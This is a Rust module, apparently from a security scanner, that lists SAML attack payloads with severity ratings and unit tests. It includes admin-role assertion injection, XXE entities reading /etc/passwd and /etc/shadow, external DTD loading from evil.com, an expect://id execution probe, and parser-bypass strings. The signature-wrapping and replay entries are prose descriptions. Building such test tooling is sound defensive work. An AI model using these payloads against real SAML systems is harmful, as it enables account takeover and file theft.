use super::{Payload, PayloadType, Severity};

pub fn get_payloads() -> Vec<Payload> {
    payload_vec!(PayloadType::Saml,
        "assertion-injection", [
            (
                r#"<saml:Attribute Name="role"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute>"#,
                "Role escalation via assertion attribute injection",
                Severity::Critical
            ),
            (
                r#"<saml:Attribute Name="email"><saml:AttributeValue>admin@evil.com</saml:AttributeValue></saml:Attribute>"#,
                "Email manipulation via assertion attribute injection",
                Severity::High
            ),
            (
                r#"<saml:Attribute Name="isAdmin"><saml:AttributeValue>true</saml:AttributeValue></saml:Attribute>"#,
                "Admin flag injection into SAML assertion",
                Severity::Critical
            ),
            (
                r#"<saml:Attribute Name="groups"><saml:AttributeValue>administrators</saml:AttributeValue></saml:Attribute>"#,
                "Group membership injection",
                Severity::Critical
            ),
            (
                r#"<saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject>"#,
                "Subject manipulation via NameID override",
                Severity::Critical
            )
        ];
        "xxe", [
            (
                r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>"#,
                "Basic XXE in SAML assertion to read passwd",
                Severity::Critical
            ),
            (
                r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>"#,
                "XXE shadow file read via SAML",
                Severity::Critical
            ),
            (
                r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]>"#,
                "External DTD reference XXE in SAML",
                Severity::Critical
            ),
            (
                r#"<!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">%dtd;]>"#,
                "Parameter entity XXE in SAML",
                Severity::Critical
            ),
            (
                r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>"#,
                "Expect protocol XXE for potential RCE",
                Severity::Critical
            )
        ];
        "signature-wrapping", [
            (
                r#"Copy valid assertion and wrap with attacker-controlled signature element"#,
                "Signature wrapping by duplicating assertion with new signature",
                Severity::Critical
            ),
            (
                r#"Insert malicious assertion immediately before valid ds:Signature element"#,
                "Signature wrapping via assertion insertion before valid signature",
                Severity::Critical
            ),
            (
                r#"Move ds:Signature from original assertion to injected assertion in multi-assertion response"#,
                "Signature relocation to attacker-controlled assertion",
                Severity::Critical
            ),
            (
                r#"Wrap original assertion inside saml:Advice element with attacker assertion as root"#,
                "Signature wrapping by nesting legitimate assertion under attacker assertion",
                Severity::Critical
            ),
            (
                r#"Duplicate assertion with modified Attributes but retain original Signature reference"#,
                "Attribute modification in duplicated signed assertion",
                Severity::Critical
            ),
        ];
        "replay", [
            (
                r#"Replay valid SAML assertion with expired timestamp (NotOnOrAfter in the past)"#,
                "Replay attack with expired assertion timestamp",
                Severity::High
            ),
            (
                r#"Replay assertion with modified InResponseTo field pointing to different session"#,
                "Replay with altered InResponseTo identifier",
                Severity::High
            ),
            (
                r#"Replay assertion that lacks NotOnOrAfter validation check"#,
                "Replay against endpoint without expiry validation",
                Severity::High
            ),
            (
                r#"Replay assertion with future IssueInstant to bypass time-based checks"#,
                "Replay with future-dated IssueInstant",
                Severity::High
            ),
            (
                r#"Replay assertion with changed AudienceRestriction to target different SP"#,
                "Replay assertion across service providers",
                Severity::High
            ),
        ];
        "bypass", [
            (
                r#"<!-- --><saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">"#,
                "XML comment injection to bypass SAML parser",
                Severity::High
            ),
            (
                r#"<?xml-stylesheet type="text/xml" href="evil.xsl"?><saml:Assertion>"#,
                "Processing instruction injection for XSLT-based bypass",
                Severity::High
            ),
            (
                r#"<![CDATA[<script>alert(1)</script>]]>"#,
                "CDATA section injection in SAML XML context",
                Severity::Medium
            ),
            (
                r#"<saml:Assertion xmlns:evil="http://evil.com" evil:attribute="value">"#,
                "Namespace confusion to bypass schema validation",
                Severity::High
            ),
            (
                r#"+ADw-saml:Assertion+AD4- +ADw-saml:Attribute Name+AD0AIgByb2xlACI+ +ADw-saml:AttributeValue+AD4AYWRtaW4+ +ADw-AC8-c2FtbDpBdHRyaWJ1dGVWYWx1ZT4+ +ADwALwA-c2FtbDpBdHRyaWJ1dGU+ +ADwALwA-c2FtbDpBdHRyaWJ1dGVzPg=="#,
                "UTF-7 encoded SAML assertion for encoding bypass",
                Severity::High
            ),
        ];
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn payloads_non_empty() {
        let payloads = get_payloads();
        assert!(!payloads.is_empty());
    }

    #[test]
    fn all_payloads_are_saml_type() {
        let payloads = get_payloads();
        for p in &payloads {
            assert_eq!(p.payload_type, PayloadType::Saml);
        }
    }

    #[test]
    fn contains_assertion_injection() {
        let payloads = get_payloads();
        let has = payloads
            .iter()
            .any(|p| p.tags.contains(&"assertion-injection".to_string()));
        assert!(has, "Missing assertion-injection payloads");
    }

    #[test]
    fn contains_xxe() {
        let payloads = get_payloads();
        let has = payloads.iter().any(|p| p.tags.contains(&"xxe".to_string()));
        assert!(has, "Missing xxe payloads");
    }

    #[test]
    fn contains_signature_wrapping() {
        let payloads = get_payloads();
        let has = payloads
            .iter()
            .any(|p| p.tags.contains(&"signature-wrapping".to_string()));
        assert!(has, "Missing signature-wrapping payloads");
    }

    #[test]
    fn minimum_payload_count() {
        let payloads = get_payloads();
        assert!(
            payloads.len() >= 15,
            "Expected >= 15 payloads, got {}",
            payloads.len()
        );
    }
}
